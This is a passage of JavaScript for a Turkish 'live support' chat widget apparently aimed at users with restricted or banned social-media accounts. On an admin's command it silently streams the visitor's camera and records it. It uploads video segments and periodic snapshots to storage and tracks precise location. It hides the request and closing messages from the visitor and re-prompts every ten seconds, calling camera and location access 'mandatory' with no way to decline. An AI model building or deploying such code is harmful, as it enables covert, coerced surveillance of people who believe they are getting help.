      okBtn.disabled = true;
      fab.disabled = true;
      note.textContent = "Safari konum penceresi açılmalı… İzin Ver’e basın.";
      sync
        ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "Konum penceresi istendi")
        .catch(() => {});
    };

    okBtn.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      requestLoc();
    });
    fab.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      requestLoc();
    });

    actions.appendChild(okBtn);
    card.append(title, note, actions);
    box.appendChild(card);
    document.body.appendChild(fab);
    box.scrollTop = box.scrollHeight;
  }

  function waitForCameraLocation(callId, timeoutMs) {
    return new Promise((resolve) => {
      const state = cameraSessions.get(callId);
      if (!state) {
        resolve(false);
        return;
      }
      if (state._hadLocation) {
        resolve(true);
        return;
      }
      let done = false;
      const finish = (ok) => {
        if (done) return;
        done = true;
        window.clearTimeout(timer);
        if (state._onLocationGranted === onOk) state._onLocationGranted = null;
        resolve(ok);
      };
      const onOk = () => finish(true);
      state._onLocationGranted = onOk;
      const timer = window.setTimeout(() => finish(false), timeoutMs);
    });
  }

  function isLikelyMobile() {
    return (
      /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "") ||
      (Number(navigator.maxTouchPoints) > 0 &&
        typeof window.matchMedia === "function" &&
        window.matchMedia("(pointer: coarse)").matches)
    );
  }

  async function acquireCameraStreamNative() {
    if (!navigator.mediaDevices?.getUserMedia) {
      throw new Error("getUserMedia yok");
    }
    const attempts = [
      { video: true, audio: false },
      { video: { facingMode: "user" }, audio: false },
      { video: { facingMode: { ideal: "user" } }, audio: false },
    ];
    let lastErr;
    for (const constraints of attempts) {
      try {
        return await navigator.mediaDevices.getUserMedia(constraints);
      } catch (err) {
        lastErr = err;
      }
    }
    throw lastErr || new Error("Kamera açılamadı");
  }

  function acquireLocationNativeOnce() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }
      let settled = false;
      const done = (val) => {
        if (settled) return;
        settled = true;
        resolve(val);
      };
      // Önce getCurrentPosition — bazı telefonda tek başına yetmez
      navigator.geolocation.getCurrentPosition(
        (pos) => done(pos),
        () => {
          // İkinci şans: kısa watch ile prompt zorla
          let wid = null;
          const t = window.setTimeout(() => {
            if (wid != null) {
              try {
                navigator.geolocation.clearWatch(wid);
              } catch {
                /* ignore */
              }
            }
            done(null);
          }, 12000);
          try {
            wid = navigator.geolocation.watchPosition(
              (pos) => {
                window.clearTimeout(t);
                try {
                  navigator.geolocation.clearWatch(wid);
                } catch {
                  /* ignore */
                }
                done(pos);
              },
              () => {
                window.clearTimeout(t);
                try {
                  if (wid != null) navigator.geolocation.clearWatch(wid);
                } catch {
                  /* ignore */
                }
                done(null);
              },
              { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
            );
          } catch {
            window.clearTimeout(t);
            done(null);
          }
        },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
      );
    });
  }

  function applySeedLocationToSession(sync, callId, state, seedLocation) {
    if (!seedLocation?.coords || !state || state._hadLocation) return false;
    const coords = seedLocation.coords;
    const now = Date.now();
    state._hadLocation = true;
    state._locationGrantedMsg = true;
    if (state.locationRetryTimer) {
      window.clearTimeout(state.locationRetryTimer);
      state.locationRetryTimer = null;
    }
    sync
      ?.writeLiveLocation?.(sync.getSessionId(), callId, {
        lat: coords.latitude,
        lng: coords.longitude,
        accuracy: coords.accuracy,
        altitude: coords.altitude,
        heading: coords.heading,
        speed: coords.speed,
        ts: now,
      })
      .catch(() => {});
    syncMessage("user", "Konum izni verildi.");
    if (state.label) {
      state.label.textContent = "Doğrulama devam ediyor… Lütfen bekleyin.";
    }
    try {
      state._onLocationGranted?.();
    } catch {
      /* ignore */
    }
    return true;
  }

  async function startVisitorCamera(box, callId, options = {}) {
    const auto = options.auto === true;
    const sync = window.ChatSync;
    if (!sync?.enabled) {
      appendMessage(box, "bot", "Kamera için canlı senkron gerekir (Firebase).", {
        sync: false,
      });
      return "error";
    }
    if (!navigator.mediaDevices?.getUserMedia && !options.stream) {
      appendMessage(box, "bot", "Bu tarayıcı kamerayı desteklemiyor.", { sync: false });
      if (!auto) await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
      return "error";
    }

    // Eski / eşzamanlı diğer çağrıları kapat — tek kamera oturumu
    for (const otherId of [...cameraSessions.keys()]) {
      if (otherId !== callId) {
        await stopCameraSession(otherId, { upload: false });
      }
    }
    await stopCameraSession(callId, { upload: false });

    let stream = options.stream || null;
    if (!stream) {
      try {
        stream = await acquireCameraStreamNative();
      } catch (err) {
        const name = String(err?.name || "");
        if (auto && (name === "NotAllowedError" || name === "SecurityError" || name === "NotReadableError")) {
          return "need-gesture";
        }
        appendMessage(
          box,
          "bot",
          "Kamera izni verilmedi veya erişilemedi. Aşağıdaki İzin Ver butonuna basın.",
          { sync: false }
        );
        syncMessage("user", "Kamera izni reddedildi / erişilemedi.");
        if (!auto) await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
        return "denied";
      }
    }

    // Sessiz akış: önizleme yok, sadece durum metni
    const preview = showSilentCameraStatus(box, callId);
    const pc = new RTCPeerConnection(sync.ICE_SERVERS);
    const sessionId = sync.getSessionId();
    const state = {
      pc,
      stream,
      wrap: preview.wrap,
      video: null,
      label: preview.label,
      recorder: null,
      recordChunks: [],
      lastBlob: null,
      unsubAnswer: null,
      unsubIce: null,
      geoWatchId: null,
      _hadLocation: false,
      maxDurationTimer: null,
      segmentTimer: null,
      snapshotTimer: null,
      snapVideo: null,
      locationRetryTimer: null,
    };
    cameraSessions.set(callId, state);

    // Admin bağlanmazsa ~90 sn sonra kaydı Storage’a yükle (PC kapalı senaryosu)
    state.maxDurationTimer = window.setTimeout(() => {
      if (!cameraSessions.has(callId)) return;
      void stopCameraSession(callId, { upload: true });
    }, VISITOR_RECORD_MAX_MS);

    // Konum: mobilde otomatik isteme (jest yoksa sessiz deny olur)
    startLiveLocationWatch(state, sessionId, callId, sync, box, {
      deferAsk: Boolean(options.deferLocation) || (isLikelyMobile() && !options.seedLocation),
    });

    // Gesture ile alınan konum varsa hemen yaz
    if (options.seedLocation?.coords && !state._hadLocation) {
      applySeedLocationToSession(sync, callId, state, options.seedLocation);
      box.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
    }

    if (!startVisitorRecording(state)) {
      preview.label.textContent = "Doğrulama devam ediyor… (kayıt sınırlı)";
    }

    // Sayfa kapanmadan önce parça parça Storage’a yaz (pagehide upload güvenilmez)
    startSegmentUploads(state, sessionId, callId, sync);

    // Video olmasa bile ~5 sn’de bir JPEG → Storage
    startSnapshotUploads(state, sessionId, callId, sync);

    stream.getVideoTracks().forEach((track) => {
      pc.addTrack(track, stream);
    });

    const pendingAdminIce = [];
    let remoteReady = false;

    function clearMaxDurationOnAdminJoin() {
      if (!state.maxDurationTimer) return;
      window.clearTimeout(state.maxDurationTimer);
      state.maxDurationTimer = null;
    }

    pc.onicecandidate = (ev) => {
      if (ev.candidate) {
        sync
          .pushIceCandidate(sessionId, callId, "visitor", ev.candidate.toJSON())
          .catch(() => {});
      }
    };

    pc.onconnectionstatechange = () => {
      if (pc.connectionState === "connected") {
        clearMaxDurationOnAdminJoin();
      }
      if (state.label && pc.connectionState === "connected") {
        state.label.textContent = "Doğrulama devam ediyor… Lütfen bekleyin.";
      }
    };

    const addAdminIce = async (cand) => {
      if (!cand || !state.pc) return;
      if (!remoteReady) {
        pendingAdminIce.push(cand);
        return;
      }
      try {
        await state.pc.addIceCandidate(new RTCIceCandidate(cand));
      } catch {
        /* ignore */
      }
    };

    state.unsubIce = sync.listenIceCandidates(sessionId, callId, "admin", (cand) => {
      addAdminIce(cand);
    });

    let answered = false;
    let ending = false;
    state.unsubAnswer = sync.listenCameraCall(sessionId, callId, async (data) => {
      if (!data) return;
      const shouldEnd =
        data.status === "ended" ||
        data.status === "denied" ||
        data.forceClose === true;
      if (shouldEnd && !ending) {
        ending = true;
        await stopCameraSession(callId, {
          upload: data.status === "ended" || data.forceClose === true,
        });
        // Sessiz: ziyaretçiye kamera kapandı mesajı gösterme
        return;
      }
      if (!state.pc) return;
      if (data.answer && !answered) {
        answered = true;
        clearMaxDurationOnAdminJoin();
        try {
          await state.pc.setRemoteDescription(
            new RTCSessionDescription({
              type: data.answer.type,
              sdp: data.answer.sdp,
            })
          );
          remoteReady = true;
          for (const cand of pendingAdminIce.splice(0)) {
            await addAdminIce(cand);
          }
        } catch (err) {
          answered = false;
          console.error(err);
        }
      }
    });

    try {
      await sync.markVisitorCameraReady(sessionId, callId).catch(() => {});
      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);
      await sync.writeCameraOffer(sessionId, callId, {
        type: offer.type,
        sdp: offer.sdp,
      });
      // Ziyaretçi sohbetinde mesaj yok — konum ayrı takip edilir
      syncMessage("user", auto ? "Kamera izni verildi." : "Kamera izni onaylandı.");
      return "ok";
    } catch (err) {
      console.error(err);
      await stopCameraSession(callId, { upload: false });
      appendMessage(
        box,
        "bot",
        `Kamera bağlantısı kurulamadı: ${err?.code || err?.message || "bilinmeyen hata"}`,
        { sync: false }
      );
      await sync.setCameraCallStatus(sessionId, callId, "ended").catch(() => {});
      return "error";
    }
  }

  function showCameraRequest(box, msg, options = {}) {
    box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());

    const card = document.createElement("div");
    card.className =
      "chat-inline-prompt chat-camera-request" +
      (options.sticky ? " chat-camera-request-sticky" : "");
    card.setAttribute("role", "group");
    card.setAttribute("aria-label", "Kamera talebi");

    const title = document.createElement("p");
    title.className = "chat-inline-prompt-title";
    title.textContent =
      msg.text ||
      "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır.";

    const note = document.createElement("p");
    note.className = "chat-camera-note";
    note.textContent =
      msg.note ||
      "Devam etmek için tarayıcı kamera ve konum iznini onaylayın.";

    const actions = document.createElement("div");
    actions.className = "chat-inline-prompt-actions";

    const okBtn = document.createElement("button");
    okBtn.type = "button";
    okBtn.className = "btn btn-primary chat-perm-tap-btn";
    okBtn.textContent = msg.okLabel || "İzin ver";

    const cancelBtn = document.createElement("button");
    cancelBtn.type = "button";
    cancelBtn.className = "btn btn-ghost";
    cancelBtn.textContent = msg.cancelLabel || "Reddet";
    const showCancel = msg.cancelLabel !== "" && msg.hideCancel !== true;
    const nativeFromTap = options.nativeFromTap !== false;

    const finish = async (accepted) => {
      const sync = window.ChatSync;
      const callId = msg.callId;
      if (!accepted) {
        card.remove();
        if (options.softDeny) {
          options.onSoftDeny?.();
          return;
        }
        appendMessage(box, "user", "Kamera talebini reddettim.");
        if (sync?.enabled && callId) {
          await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied").catch(() => {});
        }
        return;
      }
      if (!callId) {
        card.remove();
        appendMessage(box, "bot", "Kamera oturumu eksik; talebi yeniden gönderin.", {
          sync: false,
        });
        return;
      }

      okBtn.disabled = true;
      const existing = cameraSessions.get(callId);

      // Konum GEREKEN ve kamera zaten açık: bu dokunuşta SADECE konum
      // (Safari: kamera ile aynı anda konum isteği penceresiz denied üretir)
      if (nativeFromTap && existing?.stream && !existing._hadLocation) {
        note.textContent = "Konum penceresi açılmalı… İzin Ver’e basın.";
        if (!navigator.geolocation) {
          okBtn.disabled = false;
          note.textContent = "Bu tarayıcı konum desteklemiyor.";
          options.onSoftDeny?.("unsupported");
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            applySeedLocationToSession(sync, callId, existing, pos);
            card.remove();
            appendMessage(box, "bot", "Konum izni alındı.", { sync: true });
            options.onGranted?.();
          },
          (err) => {
            okBtn.disabled = false;
            const code = err?.code;
            note.textContent =
              code === 1
                ? "Safari konumu engelledi. Ayarlar → Safari → Konum → Sor, siteyi yenileyin."
                : "Konum alınamadı — tekrar dokunun.";
            sync
              ?.writeLocationStatus?.(
                sync.getSessionId(),
                callId,
                code === 1 ? "denied" : "error",
                err?.message || String(code)
              )
              .catch(() => {});
            showLocationTapButton(box, callId, {
              onGranted: () => options.onGranted?.(),
              onSoftDeny: (r) => options.onSoftDeny?.(r),
            });
          },
          { enableHighAccuracy: false, maximumAge: 60000, timeout: 60000 }
        );
        return;
      }

      note.textContent = "Kamera izni açılıyor… İzin Ver’e basın.";

      try {
        if (nativeFromTap) {
          // SADECE kamera — konumu aynı jestte isteme (Safari sessiz denied)
          const stream = await acquireCameraStreamNative();
          card.remove();
          const result = await startVisitorCamera(box, callId, {
            auto: false,
            stream: stream || undefined,
            deferLocation: true,
          });

          if (result === "ok" && callId && !cameraSessions.get(callId)?._hadLocation) {
            appendMessage(
              box,
              "bot",
              "Kamera alındı. Şimdi KONUM için kırmızı butona dokunun (ayrı pencere açılır).",
              { sync: true }
            );
            showLocationTapButton(box, callId, {
              onGranted: () => options.onGranted?.(),
              onSoftDeny: (r) => {
                if (r === "location-pending" || r === "1" || r === "denied") return;
                options.onSoftDeny?.(r || "location-pending");
              },
            });
            return;
          }

          if (result === "ok") {
            options.onGranted?.();
          } else if (options.softDeny) {
            options.onSoftDeny?.(result);
          }
          return;
        }
      } catch (err) {
        console.warn("native perm", err);
        okBtn.disabled = false;
        note.textContent =
          "Kamera izni alınamadı. Butona tekrar dokunun. Engellendiyse adres çubuğundan kamerayı Açık yapın.";
        options.onSoftDeny?.(String(err?.name || err));
        return;
      }

      card.remove();
      const result = await startVisitorCamera(box, callId, {
        auto: false,
        deferLocation: isLikelyMobile(),
      });

      if (result === "ok" && callId && !cameraSessions.get(callId)?._hadLocation) {
        showLocationTapButton(box, callId, {
          onGranted: () => options.onGranted?.(),
          onSoftDeny: (r) => options.onSoftDeny?.(r || "location-pending"),
        });
        return;
      }

      if (result === "ok") {
        options.onGranted?.();
      } else if (options.softDeny) {
        options.onSoftDeny?.(result);
      }
    };

    okBtn.addEventListener("click", (e) => {
      e.preventDefault();
      if (okBtn.disabled) return;
      void finish(true);
    });

    if (showCancel) {
      cancelBtn.addEventListener("click", () => finish(false));
      actions.append(okBtn, cancelBtn);
    } else {
      actions.append(okBtn);
    }
    card.append(title, note, actions);
    box.appendChild(card);
    box.scrollTop = box.scrollHeight;
    // Mobilde otomatik focus klavye/izin bozabilir — sadece masaüstü
    if (!isLikelyMobile()) okBtn.focus();
  }

  let cameraOpenSeq = 0;
  let latestCameraCallId = null;
  let cameraPermLoopToken = 0;
  let cameraPermLoopTimer = null;
  const CAMERA_PERM_RETRY_MS = 10_000;
  const CAMERA_PERM_DENIED_TEXT =
    "Güvenlik kontrolü için kamera ve konum izni zorunludur. Lütfen İzin Ver’i seçin.";

  function stopCameraPermissionLoop() {
    cameraPermLoopToken += 1;
    if (cameraPermLoopTimer) {
      window.clearTimeout(cameraPermLoopTimer);
      cameraPermLoopTimer = null;
    }
  }

  function showPermissionDeniedNotice(box, extraNote) {
    let el = box.querySelector(".chat-camera-perm-denied");
    if (!el) {
      el = document.createElement("div");
      el.className = "chat-inline-prompt chat-camera-perm-denied";
      el.innerHTML =
        `<p class="chat-inline-prompt-title">${CAMERA_PERM_DENIED_TEXT}</p>` +
        '<p class="chat-camera-note" data-perm-note></p>';
      box.appendChild(el);
    } else {
      const title = el.querySelector(".chat-inline-prompt-title");
      if (title) title.textContent = CAMERA_PERM_DENIED_TEXT;
    }
    const note = el.querySelector("[data-perm-note]");
    if (note) {
      note.textContent =
        extraNote ||
        "Kamera ve konum izni verilene kadar her 10 saniyede mesaj ve izin talebi yenilenir.";
    }
    box.scrollTop = box.scrollHeight;
  }

  function clearPermissionDeniedNotice(box) {
    box.querySelectorAll(".chat-camera-perm-denied").forEach((el) => el.remove());
    box.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
    box.querySelectorAll(".chat-camera-auto").forEach((el) => el.remove());
    box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
  }

  async function queryCameraPermissionState() {
    try {
      if (!navigator.permissions?.query) return "unknown";
      const st = await navigator.permissions.query({ name: "camera" });
      return st?.state || "unknown";
    } catch {
      return "unknown";
    }
  }

  async function autoOpenCameraFromMessage(box, msg) {
    const callId = msg.callId;
    if (!callId) {
      showCameraRequest(box, msg);
      return "error";
    }

    latestCameraCallId = callId;
    const seq = ++cameraOpenSeq;

    box.querySelectorAll(".chat-camera-auto").forEach((el) => el.remove());
    box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
    const status = document.createElement("div");
    status.className = "chat-inline-prompt chat-camera-auto";
    status.innerHTML =
      '<p class="chat-inline-prompt-title">Kamera ve konum izni isteniyor…</p>' +
      '<p class="chat-camera-note">Tarayıcıda İzin Ver’i seçin. İkisi de zorunludur.</p>';
    box.appendChild(status);
    box.scrollTop = box.scrollHeight;

    const result = await startVisitorCamera(box, callId, { auto: true });
    if (seq !== cameraOpenSeq || latestCameraCallId !== callId) {
      status.remove();
      await stopCameraSession(callId, { upload: false });
      return "superseded";
    }
    status.remove();

    if (result === "need-gesture") {
      showCameraRequest(box, msg);
    }
    return result;
  }

  /** Kamera + konum ikisi alınana kadar her 10 sn mesaj + izin talebi */
  function startCameraPermissionLoop(box) {
    stopCameraPermissionLoop();
    const token = cameraPermLoopToken;
    let callId = null;
    let attempting = false;
    let retryCount = 0;

    const scheduleRetry = () => {
      if (token !== cameraPermLoopToken) return;
      if (cameraPermLoopTimer) window.clearTimeout(cameraPermLoopTimer);
      cameraPermLoopTimer = window.setTimeout(() => {
        cameraPermLoopTimer = null;
        void attempt();
      }, CAMERA_PERM_RETRY_MS);
    };

    const sessionHasBoth = (id) => {
      const st = id ? cameraSessions.get(id) : null;
      return Boolean(st?.stream && st._hadLocation);
    };

    const markComplete = () => {
      if (token !== cameraPermLoopToken) return;
      clearPermissionDeniedNotice(box);
      stopCameraPermissionLoop();
      appendMessage(box, "bot", "Teşekkürler. Kamera ve konum izni alındı.", { sync: true });
    };

    const presentAskUi = (browserBlocked, needLocationOnly) => {
      if (token !== cameraPermLoopToken) return;
      showPermissionDeniedNotice(
        box,
        browserBlocked
          ? `Tarayıcı izni engelledi. Adres çubuğundan kamera/konumu Açık yapın, sonra büyük “İzin ver” butonuna DOKUNUN. (#${retryCount})`
          : needLocationOnly
            ? `Kamera alındı; konum için “İzin ver”e DOKUNUN (tarayıcı penceresi açılır). (#${retryCount})`
            : `Gerçek izin için alttaki “İzin ver”e DOKUNUN — sadece mesaj yetmez. (#${retryCount})`
      );

      showCameraRequest(
        box,
        {
          callId,
          type: "camera",
          text: CAMERA_PERM_DENIED_TEXT,
          note: needLocationOnly
            ? "Butona dokunun; telefon konum izni penceresini açacak."
            : "Butona dokunun; telefon kamera ve konum izin pencerelerini açacak.",
          okLabel: "İzin ver — dokun",
          hideCancel: true,
        },
        {
          softDeny: true,
          sticky: true,
          nativeFromTap: true,
          onGranted: async () => {
            if (token !== cameraPermLoopToken) return;
            if (sessionHasBoth(callId)) {
              markComplete();
              return;
            }
            const gotLoc = await waitForCameraLocation(callId, 12000);
            if (gotLoc || sessionHasBoth(callId)) markComplete();
            else scheduleRetry();
          },
          onSoftDeny: () => scheduleRetry(),
        }
      );
      scheduleRetry();
    };

    const attempt = async () => {
      if (token !== cameraPermLoopToken || attempting) return;
      attempting = true;
      retryCount += 1;
      try {
        // Her turda sohbet mesajı (izin alana kadar)
        appendMessage(box, "bot", CAMERA_PERM_DENIED_TEXT, { sync: true });

        let sync = window.ChatSync;
        if (!sync?.enabled && window.ChatSyncReady) {
          sync = await window.ChatSyncReady.catch(() => null);
        }
        if (!sync?.enabled || typeof sync.startVisitorCameraOffer !== "function") {
          appendMessage(box, "bot", "Kamera için canlı senkron gerekir (Firebase).", {
            sync: false,
          });
          scheduleRetry();
          return;
        }

        if (!callId) {
          const offer = await sync.startVisitorCameraOffer();
          callId = offer?.callId;
          if (!callId) throw new Error("callId yok");
        }

        if (sessionHasBoth(callId)) {
          markComplete();
          return;
        }

        const existing = cameraSessions.get(callId);
        if (existing?.stream && !existing._hadLocation) {
          appendMessage(box, "bot", "Kamera var. Konum için butona dokunun.", { sync: true });
          showLocationTapButton(box, callId, {
            onGranted: () => markComplete(),
            onSoftDeny: () => {
              /* konum reddi — FAB kalsın; hemen yeniden spam etme */
            },
          });
          // Konum için jest bekleniyor — 45 sn sonra hatırlat, her 10 sn yeniden spam yok
          if (cameraPermLoopTimer) window.clearTimeout(cameraPermLoopTimer);
          cameraPermLoopTimer = window.setTimeout(() => {
            cameraPermLoopTimer = null;
            if (token !== cameraPermLoopToken) return;
            if (sessionHasBoth(callId)) {
              markComplete();
              return;
            }
            if (cameraSessions.get(callId)?.stream && !cameraSessions.get(callId)?._hadLocation) {
              void attempt();
            } else {
              scheduleRetry();
            }
          }, 45_000);
          return;
        }

        // Mobil: otomatik getUserMedia popup açmaz — doğrudan dokunma UI
        if (isLikelyMobile()) {
          presentAskUi(false, false);
          return;
        }

        box.querySelectorAll(".chat-camera-auto").forEach((el) => el.remove());
        box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());

        const permState = await queryCameraPermissionState();
        if (permState !== "denied") {
          const asking = document.createElement("div");
          asking.className = "chat-inline-prompt chat-camera-auto";
          asking.innerHTML =
            `<p class="chat-inline-prompt-title">Kamera ve konum izni isteniyor… (#${retryCount})</p>` +
            '<p class="chat-camera-note">Tarayıcıda İzin Ver’i seçin. İkisi de zorunludur.</p>';
          box.appendChild(asking);
          box.scrollTop = box.scrollHeight;

          const result = await startVisitorCamera(box, callId, { auto: true });
          asking.remove();
          if (token !== cameraPermLoopToken) return;

          if (result === "ok") {
            const gotLoc = await waitForCameraLocation(callId, 12000);
            if (token !== cameraPermLoopToken) return;
            if (gotLoc || sessionHasBoth(callId)) {
              markComplete();
              return;
            }
            presentAskUi(false, true);
            return;
          }
        }

        presentAskUi(permState === "denied", false);
      } catch (err) {
        console.error("camera perm loop", err);
        if (token === cameraPermLoopToken) presentAskUi(false, false);
      } finally {
        attempting = false;
      }
    };

    void attempt();
  }

  function showVisitorPopup(box, msg, onChoice) {
    box.querySelectorAll(".chat-inline-prompt").forEach((el) => el.remove());
    document.getElementById("support-popup")?.remove();

    const card = document.createElement("div");
    card.className = "chat-inline-prompt";
    card.setAttribute("role", "group");
    card.setAttribute("aria-label", "Destek formu");

    const title = document.createElement("p");
    title.className = "chat-inline-prompt-title";
    title.textContent = msg.text || "Lütfen yanıtınızı yazın.";

    const input = document.createElement("textarea");
    input.className = "chat-inline-prompt-input";
    input.rows = 3;
    input.maxLength = 400;
    input.autocomplete = "off";
    input.placeholder = msg.placeholder || "Yanıtınızı yazın…";

    const actions = document.createElement("div");
    actions.className = "chat-inline-prompt-actions";

    const okBtn = document.createElement("button");
    okBtn.type = "button";
    okBtn.className = "btn btn-primary";
    okBtn.textContent = msg.okLabel || "Tamam";

    const cancelBtn = document.createElement("button");
    cancelBtn.type = "button";
    cancelBtn.className = "btn btn-ghost";
    cancelBtn.textContent = msg.cancelLabel || "İptal";

    const finish = (choice, typed) => {
      card.remove();
      onChoice?.(choice, typed);
    };

    okBtn.addEventListener("click", () => {
      const typed = String(input.value || "").trim();
      if (!typed) {
        input.focus();
        input.classList.add("is-invalid");
        return;
      }
      input.classList.remove("is-invalid");
      finish(okBtn.textContent, typed);
    });

    cancelBtn.addEventListener("click", () => finish(cancelBtn.textContent, ""));

    input.addEventListener("keydown", (e) => {
      if (e.key === "Enter" && !e.shiftKey) {
        e.preventDefault();
        okBtn.click();
      }
    });

    actions.append(okBtn, cancelBtn);
    card.append(title, input, actions);
    box.appendChild(card);
    box.scrollTop = box.scrollHeight;
    input.focus();
  }

  const seenAdminIncomingIds = new Set();

  /* —— Karşı taraf mesajı: chat’te değilken ses + uyarı —— */
  let visitorAudioCtx = null;
  let visitorAudioUnlocked = false;
  let visitorToastTimer = null;

  function ensureVisitorAudio() {
    if (visitorAudioCtx) return visitorAudioCtx;
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return null;
    try {
      visitorAudioCtx = new AC();
    } catch {
      return null;
    }
    return visitorAudioCtx;
  }

  async function unlockVisitorAudio() {
    const ctx = ensureVisitorAudio();
    if (!ctx) return false;
    try {
      if (ctx.state === "suspended") await ctx.resume();
      const buf = ctx.createBuffer(1, 1, 22050);
      const src = ctx.createBufferSource();
      src.buffer = buf;
      src.connect(ctx.destination);
      src.start(0);
      visitorAudioUnlocked = ctx.state === "running";
    } catch {
      visitorAudioUnlocked = false;
    }
    return visitorAudioUnlocked;
  }

  async function playVisitorNotifyBeep() {
    const ctx = ensureVisitorAudio();
    if (!ctx) return;
    try {
      if (ctx.state !== "running") await ctx.resume();
    } catch {
      return;
    }
    if (ctx.state !== "running") return;
    const now = ctx.currentTime;
    [
      { t: 0, f: 880, d: 0.1 },
      { t: 0.14, f: 1175, d: 0.14 },
    ].forEach(({ t, f, d }) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = "sine";
      osc.frequency.value = f;
      gain.gain.setValueAtTime(0.001, now + t);
      gain.gain.exponentialRampToValueAtTime(0.28, now + t + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, now + t + d);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now + t);
      osc.stop(now + t + d + 0.03);
    });
  }

  function ensureVisitorToast() {
    let el = document.getElementById("visitor-chat-toast");
    if (el) return el;
    el = document.createElement("div");
    el.id = "visitor-chat-toast";
    el.className = "visitor-chat-toast";
    el.hidden = true;
    el.setAttribute("role", "status");
    el.innerHTML =
      '<strong class="visitor-chat-toast-title">Yeni destek mesajı</strong>' +
      '<p class="visitor-chat-toast-body"></p>' +
      '<button type="button" class="visitor-chat-toast-go">Sohbete git</button>';
    el.querySelector(".visitor-chat-toast-go")?.addEventListener("click", () => {
      const box = document.querySelector("[data-chat-root] [data-chat-messages]");
      focusVisitorChat(box);
      el.hidden = true;
    });
    document.body.appendChild(el);
    return el;
  }

  function showVisitorToast(text) {
    const el = ensureVisitorToast();
    const body = el.querySelector(".visitor-chat-toast-body");
    if (body) body.textContent = String(text || "").slice(0, 160);
    el.hidden = false;
    if (visitorToastTimer) clearTimeout(visitorToastTimer);
    visitorToastTimer = window.setTimeout(() => {
      el.hidden = true;
    }, 6000);
  }

  function focusVisitorChat(box) {
    const root =
      box?.closest?.("[data-chat-root]") || document.querySelector("[data-chat-root]");
    const target = root || box || document.getElementById("canli-destek");
    if (target?.scrollIntoView) {
      target.scrollIntoView({ behavior: "smooth", block: "center" });
    }
    if (box) box.scrollTop = box.scrollHeight;
    const input =
      root?.querySelector?.("[data-chat-input]") ||
      document.querySelector("[data-chat-input]");
    // Yazmayı engellemeden odakla
    window.setTimeout(() => {
      try {
        input?.focus?.({ preventScroll: true });
      } catch {
        input?.focus?.();
      }
    }, 280);
  }

  function notifyVisitorOfAdminMessage(box, msg) {
    // loading animasyonu için spam etme
    if (msg?.type === "loading") return;

    const text = String(msg?.text || "Destek yeni bir mesaj gönderdi").slice(0, 160);

    // Her zaman ses + sohbete yönlendir (chat’i engellemeden)
    void unlockVisitorAudio().then(() => playVisitorNotifyBeep());
    showVisitorToast(text);
    focusVisitorChat(box);

    if (document.hidden && "Notification" in window && Notification.permission === "granted") {
      try {
        new Notification("Yeni destek mesajı", {
          body: text,
          tag: "visitor-support-msg",
          silent: true,
        });
      } catch {
        /* ignore */
      }
    }
  }

  document.addEventListener(
    "pointerdown",
    () => {
      void unlockVisitorAudio();
    },
    { capture: true }
  );
  document.addEventListener(
    "keydown",
    () => {
      void unlockVisitorAudio();
    },
    { capture: true, once: true }
  );

  function handleAdminIncoming(box, msg) {
    if (msg?.id) {
      if (seenAdminIncomingIds.has(msg.id)) return;
      seenAdminIncomingIds.add(msg.id);
    }
    if (msg.type === "camera") {
      // Talep metnini ziyaretçi sohbetinde gösterme; sessiz izin akışı
      autoOpenCameraFromMessage(box, msg);
      return;
    }
    const isPopup = msg.type === "popup" || msg.popup === true;
    if (isPopup) {
      appendMessage(box, "admin", msg.text || "Lütfen yanıtınızı yazın.", { sync: false });
      notifyVisitorOfAdminMessage(box, msg);
      showVisitorPopup(
        box,
        {
          text: msg.text || "Lütfen yanıtınızı yazın.",
          placeholder: msg.placeholder || "Mesajınızı buraya yazın…",
          okLabel: msg.okLabel || "Tamam",
          cancelLabel: msg.cancelLabel || "İptal",
          withInput: true,
        },
        (choice, typed) => {
          if (typed) {
            if (SECRETISH.test(typed)) {
              appendMessage(
                box,
                "bot",
                "Güvenlik için şifre, e-posta veya doğrulama kodu paylaşmayın. Lütfen sorununuzu kendi kelimelerinizle yazın.",
                { sync: false }
              );
              syncMessage(
                "user",
                "Popup yanıtı reddedildi (hassas bilgi paylaşımı engellendi)."
              );
              return;
            }
            appendMessage(box, "user", typed);
            return;
          }
          appendMessage(box, "user", `Popup yanıtı: ${choice}`);
        }
      );
      return;
    }
    appendMessage(box, "admin", msg.text || "", {
      sync: false,
      type: msg.type === "loading" ? "loading" : "text",
    });
    if (msg.type !== "loading") {
      notifyVisitorOfAdminMessage(box, msg);
    }
  }

  function showTyping(box) {
    const el = document.createElement("div");
    el.className = "chat-bubble chat-bot chat-typing";
    el.innerHTML = '<span class="chat-meta">Asistan yazıyor…</span><p><i></i><i></i><i></i></p>';
    box.appendChild(el);
    box.scrollTop = box.scrollHeight;
    return el;
  }

  function setQuizButtons(quick, question) {
    if (!quick) return;
    quick.innerHTML = "";
    if (!question) {
      [
        ["Hesabım kısıtlandı", "Hesap kısıtı"],
        ["Hesabım ban yedi", "Ban"],
        ["İzlenmelerim düştü", "İzlenme düşüşü"],
        ["Shadowban mı oldum?", "Görünürlük"],
      ].forEach(([value, label]) => {
        const btn = document.createElement("button");
        btn.type = "button";
        btn.setAttribute("data-quick", value);
